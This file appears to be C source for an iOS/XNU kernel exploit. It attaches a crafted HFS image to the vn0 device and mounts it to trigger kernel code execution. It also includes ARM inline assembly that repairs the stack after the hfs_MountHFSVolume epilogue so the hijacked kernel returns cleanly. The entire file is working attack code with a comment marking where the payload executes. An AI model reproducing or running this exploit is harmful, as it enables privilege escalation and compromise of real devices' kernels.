#include <sys/mman.h>
#include <sys/mount.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/ioccom.h>
#define KERNEL_PRIVATE
#include <sys/vnioctl.h>
#undef KERNEL_PRIVATE
#include <sys/fcntl.h>
#include <sys/stat.h>
#include <mach/boolean.h>

struct hfs_mount_args {
    char     *fspec;
    uid_t     hfs_uid;
    gid_t     hfs_gid;
    mode_t    hfs_mask;
    u_int32_t hfs_encoding;
    struct    timezone hfs_timezone;
    int       flags;
    int       journal_tbuffer_size;
    int       journal_flags;
    int       journal_disable;
};

void prepare_vndevice() {
	struct vn_ioctl vn;

	int fd = open("/dev/vn0", O_RDONLY, 0);
	if (fd < 0) {
	    	printf("Can't openn /dev/vn0 special file.\n");
		exit(1);
	}

	// detach
	ioctl(fd, VNIOCDETACH, &vn);

	// attach
	vn.vn_file = "hfs_mdb";
	vn.vn_control = vncontrol_readwrite_io_e;
	if (ioctl(fd, VNIOCATTACH, &vn) < 0) {
		printf("Can't attach vn0.\n");
		close(fd);
		exit(1);
	}
	close(fd);
}

void mount_evil_hfs() {
	struct hfs_mount_args mount_args;
	memset(&mount_args, 0, sizeof(mount_args));
	mount_args.fspec="/dev/vn0";
	mount_args.hfs_uid=99;
	mount_args.hfs_gid=99;
	mount_args.hfs_mask=(S_IRWXU | S_IROTH | S_IXOTH);
	int ret = mount("hfs", "/mnt/", MNT_RDONLY, (void*) &mount_args);
	
	//*** kernel payload code execution happens here ***
	
	printf("mount ret code : 0x%X\n", ret);
	if (ret < 0) {
		printf("hfs mount failed. :-(\n");
		exit(1);
	}
}

void payload() {
	// push	{r7, lr}

	asm (
		// the compiler adds a push before the code, reverting the effect:
		"add     sp, sp, #0x8\n\t"

		// hfs_MountHFSVolume epilog:
        	"add     sp, sp, #0xE4\n\t"
        	"pop     {r2-r4}\n\t"
        	"mov     r8, r2\n\t"
        	"mov     r10, r3\n\t"
		"mov     r11, r4\n\t"
		"pop     {r4-r7,pc}"
	);

	// pop	{r7, pc}
}

int main(int argc, char* argv[]) {
	prepare_vndevice();
	mount_evil_hfs();
}
